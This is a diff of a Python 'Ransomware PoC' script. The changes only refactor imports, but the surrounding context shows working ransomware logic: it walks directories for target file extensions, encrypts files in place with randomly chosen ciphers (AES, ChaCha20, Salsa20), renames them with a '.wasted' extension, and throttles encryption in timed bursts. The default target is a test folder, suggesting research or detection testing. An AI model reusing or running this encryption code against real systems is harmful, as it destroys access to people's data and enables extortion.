@@ -1,8 +1,8 @@
-import argparse
-import os
-import sys
-import time
+from argparse import ArgumentParser
 from base64 import b64encode, b64decode
+from os import environ, path, rename, walk
+from sys import argv
+from time import time, sleep
 
 from Crypto.Cipher import AES, ChaCha20, Salsa20, PKCS1_OAEP
 from Crypto.PublicKey import RSA
@@ -15,7 +15,7 @@ from globals import get_config_from_file
 # ============ 		GLOBALS 	  ==============
 # ============================================================
 
-LINUX_STARTDIRS = [os.environ['HOME'] + '/test_ransomware']
+LINUX_STARTDIRS = [environ['HOME'] + '/test_ransomware']
 EXTENSION = ".wasted"  # Ransomware custom extension
 
 # ============================================================
@@ -104,9 +104,9 @@ def discover_files(start_path):
         EXTENSION.split(".")[1],  # ransomware extension, drop dot from global constant
     ]
 
-    for dir_path, dirs, files in os.walk(start_path):
+    for dir_path, dirs, files in walk(start_path):
         for i in files:
-            absolute_path = os.path.abspath(os.path.join(dir_path, i))
+            absolute_path = path.abspath(path.join(dir_path, i))
             ext = absolute_path.split('.')[-1]
             if ext in extensions:
                 yield absolute_path
@@ -181,7 +181,7 @@ def select_encryption_algorithm(key):
 
 
 def select_decryption_algorithm(filename, key):
-    split = os.path.basename(filename).split(".")[-2].split("--")
+    split = path.basename(filename).split(".")[-2].split("--")
     flag = split[0]
     extra = split[1] if len(split) > 1 else None
     match flag:
@@ -208,7 +208,7 @@ def select_decryption_algorithm(filename, key):
 def encrypt_files(key, start_dirs):
     file_counter = 0
     file_sizes = 0
-    burst_start = time.time()
+    burst_start = time()
 
     # Recursively go through folders and encrypt files
     for curr_dir in start_dirs:
@@ -219,23 +219,23 @@ def encrypt_files(key, start_dirs):
                 limit_files = config["BURST"]["duration"].startswith("f")
                 rate = float(config["BURST"]["rate"])
 
-                file_sizes += os.path.getsize(file)  # file size in bytes (= nr of characters)
+                file_sizes += path.getsize(file)  # file size in bytes (= nr of characters)
 
                 crypt, flag, extra = select_encryption_algorithm(key)
                 modify_file_inplace(file, crypt.encrypt, flag[1:] + "0")
 
                 encrypted_name = file + (flag if not extra else flag + "--" + extra) + EXTENSION
-                os.rename(file, encrypted_name)
+                rename(file, encrypted_name)
                 print("File changed from " + file + " to " + encrypted_name)  # keep!
 
                 file_counter += 1
 
-                burst_running = time.time() - burst_start
+                burst_running = time() - burst_start
                 if rate > 0 and rate * burst_running < file_sizes:  # burst rate is limited
                     # if r * b < f then r * (b + n) = f, thus n = f/r - b
                     even_out = (file_sizes / rate) - burst_running
                     print("sleeping for", even_out, "to limit rate")
-                    time.sleep(even_out)
+                    sleep(even_out)
 
                 if duration > 0:  # burst duration is limited
                     reset_burst = False
@@ -244,17 +244,17 @@ def encrypt_files(key, start_dirs):
                         if file_counter >= duration:
                             reset_burst = True
                             print("sleeping for", config["BURST"]["pause"])
-                            time.sleep(int(config["BURST"]["pause"]))
+                            sleep(int(config["BURST"]["pause"]))
                     else:  # limit seconds instead of files
-                        print("bursting for", time.time() - burst_start, "seconds")
-                        if time.time() - burst_start >= duration:
+                        print("bursting for", time() - burst_start, "seconds")
+                        if time() - burst_start >= duration:
                             reset_burst = True
                             print("sleeping for", config["BURST"]["pause"])
-                            time.sleep(int(config["BURST"]["pause"]))
+                            sleep(int(config["BURST"]["pause"]))
                     if reset_burst:
                         file_counter = 0
                         file_sizes = 0
-                        burst_start = time.time()
+                        burst_start = time()
 
 
 def decrypt_files(key, start_dirs):
@@ -265,9 +265,9 @@ def decrypt_files(key, start_dirs):
                 crypt, flag = select_decryption_algorithm(file, key)
                 modify_file_inplace(file, crypt.decrypt, flag[-1] + "1")
 
-                abs_dir = os.path.dirname(file)
-                file_original = ".".join(os.path.basename(file).split(".")[:-2])
-                os.rename(file, os.path.join(abs_dir, file_original))
+                abs_dir = path.dirname(file)
+                file_original = ".".join(path.basename(file).split(".")[:-2])
+                rename(file, path.join(abs_dir, file_original))
                 print("File changed from " + file + " to " + file_original)
 
 
@@ -306,7 +306,7 @@ def run(absolute_paths, encrypt):
 
 
 def parse_args():
-    parser = argparse.ArgumentParser(description='Ransomware PoC')
+    parser = ArgumentParser(description='Ransomware PoC')
     parser.add_argument('-p', '--path',
                         help='Comma-separated (no-whitespace) list of absolute paths to start encryption. '
                              + 'If none specified, defaults to %%HOME%%/test_ransomware',
@@ -322,10 +322,10 @@ def parse_args():
 
 
 def main():
-    if len(sys.argv) <= 1:
+    if len(argv) <= 1:
         print('[*] Ransomware - PoC\n')
         print('Usage: python3 main.py -h')
-        print('{} -h for help.'.format(sys.argv[0]))
+        print('{} -h for help.'.format(argv[0]))
         exit(0)
 
     # Parse arguments
